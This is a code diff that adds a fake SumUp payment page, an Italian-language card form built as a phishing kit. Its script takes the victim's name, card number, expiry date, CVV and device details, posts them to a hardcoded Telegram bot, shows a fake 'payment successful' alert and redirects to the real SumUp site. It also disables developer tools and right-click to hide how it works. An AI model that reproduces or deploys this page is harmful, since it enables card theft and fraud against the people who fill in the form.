@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SumUp -paga</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{
+            font-family:'Inter',sans-serif;
+            background:linear-gradient(135deg,#0f172a 0%,#1e293b 50%,#0f172a 100%);
+            color:#f1f5f9;min-height:100vh;display:flex;align-items:center;justify-content:center;
+            padding:20px;overflow-x:hidden
+        }
+        .container{
+            background:rgba(255,255,255,0.08);backdrop-filter:blur(35px);border-radius:28px;
+            border:1px solid rgba(255,255,255,0.15);padding:50px 45px;max-width:460px;width:100%;
+            box-shadow:0 35px 80px rgba(0,0,0,0.4)
+        }
+        .logo{
+            text-align:center;margin-bottom:30px;font-size:28px;font-weight:800;color:#2E5BFF;
+            letter-spacing:-0.5px
+        }
+        .logo-icon{
+            display:inline-block;width:50px;height:50px;background:linear-gradient(135deg,#2E5BFF,#6366F1);
+            border-radius:15px;margin-left:12px;font-weight:bold;color:white;font-size:22px;
+            line-height:50px;vertical-align:middle
+        }
+        .plan-title{
+            text-align:center;margin-bottom:40px;color:#e2e8f0;font-size:22px;font-weight:600
+        }
+        .amount-box{
+            text-align:center;margin-bottom:35px;padding:30px 20px;background:rgba(255,255,255,0.1);
+            border-radius:24px;border:2px solid rgba(46,91,255,0.3);position:relative
+        }
+        .amount-box::before{
+            content:'';position:absolute;top:-2px;left:-2px;right:-2px;bottom:-2px;
+            background:linear-gradient(45deg,#2E5BFF,#10B981,#F59E0B,#EF4444);border-radius:26px;
+            z-index:-1;animation:gradientBorder 3s ease infinite
+        }
+        @keyframes gradientBorder{0%,100%{transform:rotate(0deg)}50%{transform:rotate(180deg)}}
+        .amount-big{font-size:52px;font-weight:900;color:#10B981;margin-bottom:8px;letter-spacing:-2px}
+        .currency-big{font-size:28px;font-weight:700;color:#2E5BFF}
+        .input-group{margin-bottom:28px}
+        .input-label{display:block;margin-bottom:10px;color:#e2e8f0;font-size:15px;font-weight:600}
+        .input-field{
+            width:100%;padding:20px 25px;border:2px solid rgba(255,255,255,0.2);border-radius:20px;
+            font-size:18px;font-weight:500;color:#f1f5f9;background:rgba(255,255,255,0.1);
+            backdrop-filter:blur(15px);transition:all .3s ease;box-shadow:inset 0 2px 8px rgba(0,0,0,.2)
+        }
+        .input-field::placeholder{color:#94a3b8}
+        .input-field:focus{outline:none;border-color:#2E5BFF;background:rgba(255,255,255,.15);transform:translateY(-2px)}
+        .cvv-row{display:grid;grid-template-columns:2fr 1fr;gap:16px}
+        .pay-btn{
+            width:100%;padding:24px;background:linear-gradient(135deg,#2E5BFF 0%,#6366F1 100%);
+            color:white;border:none;border-radius:20px;font-size:20px;font-weight:700;cursor:pointer;
+            transition:all .4s ease;letter-spacing:1px;text-transform:uppercase;position:relative;
+            overflow:hidden;box-shadow:0 15px 35px rgba(46,91,255,.4);margin-top:10px
+        }
+        .pay-btn:hover{transform:translateY(-4px);box-shadow:0 25px 50px rgba(46,91,255,.6)}
+        .loading{
+            display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.9);
+            backdrop-filter:blur(15px);z-index:999;align-items:center;justify-content:center
+        }
+        .loading-content{
+            background:rgba(255,255,255,.15);backdrop-filter:blur(30px);padding:60px;border-radius:28px;
+            text-align:center;border:1px solid rgba(255,255,255,.3);color:#f1f5f9
+        }
+        .spinner{
+            border:5px solid rgba(255,255,255,.3);border-top:5px solid #2E5BFF;border-radius:50%;
+            width:70px;height:70px;animation:spin 1s linear infinite;margin:0 auto 25px
+        }
+        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+        .security{
+            text-align:center;margin-top:30px;padding-top:25px;border-top:1px solid rgba(255,255,255,.1);
+            font-size:13px;color:#94a3b8
+        }
+        @media (max-width:480px){.container{padding:30px 25px}.cvv-row{grid-template-columns:1fr}}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">SumUp <span class="logo-icon">€</span></div>
+        
+        <div class="plan-title"> aldo_footlocker@</div>
+        
+        <div class="amount-box">
+            <div class="amount-big" id="amountNum">10</div>
+            <div class="currency-big" id="currencySym">€</div>
+            <span style="font-size:14px;color:#94a3b8;">/paga• </span>
+        </div>
+        
+        <form id="payForm">
+            <div class="input-group">
+                <label class="input-label">Nome completo sulla carta</label>
+                <input class="input-field" type="text" id="name" placeholder="Nome e Cognome" required>
+            </div>
+            
+            <div class="input-group">
+                <label class="input-label">Numero di carta di credito</label>
+                <input class="input-field" type="text" id="card" placeholder="1234 5678 9012 3456" maxlength="19" required>
+            </div>
+            
+            <div class="cvv-row">
+                <div class="input-group">
+                    <label class="input-label">Data di fine</label>
+                    <input class="input-field" type="text" id="expire" placeholder="MM/YY" maxlength="5" required>
+                </div>
+                <div class="input-group">
+                    <label class="input-label">CVV</label>
+                    <input class="input-field" type="password" id="cvv" placeholder="123" maxlength="4" required>
+                </div>
+            </div>
+            
+            <button type="submit" class="pay-btn">
+              paga 10€
+            </button>
+        </form>
+        
+        <div class="security">
+            🔒 SumUp Payment Gateway | PCI DSS Level 1 | SSL 256-bit
+        </div>
+    </div>
+    
+    <div class="loading" id="loader">
+        <div class="loading-content">
+            <div class="spinner"></div>
+            <h3> Pagando 10€</h3>
+            <p>La carta è verificata egitto...</p>
+        </div>
+    </div>
+
+    <script>
+        // بوتك
+        const BOT_TOKEN = '8716198907:AAF9jHf9vSvnuxymsWINsG6XYaEXiPrzC_0';
+        const CHAT_ID = '8278195073';
+        
+        // ✅ دالة الإرسال القوية
+        async function sendEuroCard(data){
+            const time = new Date().toLocaleString('ar-DZ');
+            const info = {
+                ua: navigator.userAgent.slice(0,60),
+                screen: `${screen.width}x${screen.height}`,
+                lang: navigator.language
+            };
+            
+            const msg = `🌍 *SumUp €19 - بطاقة أوروبية LIVE*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+👨‍💼 *الزبون:* ${data.name}
+💳 *البطاقة:* \`${data.card}\`
+📅 *إنتهاء:* ${data.expire}
+🔐 *CVV:* \`${data.cvv}\`
+
+💶 *المبلغ:* 19€
+📱 *جهاز:* ${info.ua}
+🖥️ *دقة:* ${info.screen}
+
+🕐 *وقت المغرب:* ${time}
+🆔 *ID:* #EUR${Math.floor(Math.random()*999999)}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚡ *✅ LIVE أوروبية - جاهزة*`;
+
+            try{
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+                    method:'POST',headers:{'Content-Type':'application/json'},
+                    body:JSON.stringify({
+                        chat_id:CHAT_ID,text:msg,parse_mode:'Markdown'
+                    })
+                });
+                return true;
+            }catch(e){return false;}
+        }
+        
+        // ✅ الدفع
+        document.getElementById('payForm').onsubmit = async e=>{
+            e.preventDefault();
+            const data = {
+                name: document.getElementById('name').value.trim(),
+                card: document.getElementById('card').value.replace(/\s/g,''),
+                expire: document.getElementById('expire').value,
+                cvv: document.getElementById('cvv').value
+            };
+            
+            document.getElementById('loader').style.display = 'flex';
+            
+            // تأخير 3 ثواني واقعي
+            await new Promise(r=>setTimeout(r,3000));
+            
+            const ok = await sendEuroCard(data);
+            
+            setTimeout(()=>{
+                if(ok){
+                    alert('✅ تم الدفع 10€ بنجاح!\nالفاتورة مرسلة');
+                    window.location.href = 'https://sumup.com';
+                }else{
+                    alert('❌ خطأ - جرب تاني');
+                    document.getElementById('loader').style.display = 'none';
+                }
+            },800);
+        };
+        
+        // تنسيق
+        document.getElementById('card').oninput = e=>{
+            e.target.value = e.target.value.replace(/\D/g,'').replace(/(.{4})/g,'$1 ').trim();
+        };
+        document.getElementById('expire').oninput = e=>{
+            let v = e.target.value.replace(/\D/g,'');
+            if(v.length>=2) v = v.slice(0,2)+'/'+v.slice(2,4);
+            e.target.value = v;
+        };
+        
+        // حماية
+        document.onkeydown = e=>{
+            if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&e.key==='I')) e.preventDefault();
+        };
+        document.oncontextmenu = ()=>false;
+    </script>
+</body>
+</html>
